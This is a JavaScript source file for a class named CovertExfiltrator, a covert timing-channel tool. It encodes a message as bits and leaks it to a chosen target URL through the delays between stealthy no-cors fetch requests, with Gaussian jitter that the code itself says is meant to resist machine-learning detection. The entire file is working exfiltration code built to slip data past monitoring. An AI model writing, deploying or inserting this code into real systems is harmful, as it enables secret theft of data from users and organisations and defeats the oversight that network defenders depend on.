// --- ADAPTIVE COVERT TRANSMITTER ---
        // Uses Box-Muller transform for Gaussian noise
        function gaussian(mean, sigma) {
          let u = 0, v = 0;
          while(u === 0) u = Math.random();
          while(v === 0) v = Math.random();
          const z = Math.sqrt(-2.0 * Math.log(u)) * Math.cos(2.0 * Math.PI * v);
          return z * sigma + mean;
        }

        function strToBits(str) {
          let bits = [];
          for (let i = 0; i < str.length; i++) {
            const bin = str.charCodeAt(i).toString(2).padStart(8, '0');
            bits.push(...bin.split('').map(Number));
          }
          return bits;
        }

        const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

        export class CovertExfiltrator {
          constructor(targetUrl) {
            this.targetUrl = targetUrl;
            this.baseDelay = 200; // ms (Logic 0)
            this.bitGap = 300;    // ms (Logic 1 = 500ms)
            this.jitterSigma = 40; // ms (Jitter)
          }

          async sendPulse(seq) {
            const noise = Math.random().toString(36).substring(7);
            const ts = Date.now();
            try {
              // Mode: no-cors is essential for speed and stealth
              await fetch(`${this.targetUrl}?seq=${seq}&ts=${ts}&z=${noise}`, {
                method: 'GET',
                mode: 'no-cors',
                cache: 'no-store'
              });
            } catch (e) { /* Fire and forget */ }
          }

          async transmit(message) {
            console.log(`[Aegis-Covert] Targeting ${this.targetUrl} with ML-Resistant Jitter`);
            const bits = strToBits(message);

            // 1. Preamble
            for (let i = 0; i < 5; i++) {
              await this.sendPulse(i);
              await sleep(50);
            }

            // 2. Transmit
            let seqCounter = 10;
            for (const bit of bits) {
              const targetDelay = bit === 0 ? this.baseDelay : (this.baseDelay + this.bitGap);
              let actualDelay = gaussian(targetDelay, this.jitterSigma);
              if (actualDelay < 10) actualDelay = 10;

              await sleep(actualDelay);
              await this.sendPulse(seqCounter);
              seqCounter++;
            }

            // 3. EOT
            await sleep(2000);
            await this.sendPulse(9999);
            console.log("[Aegis-Covert] Transmission Complete.");
          }
        }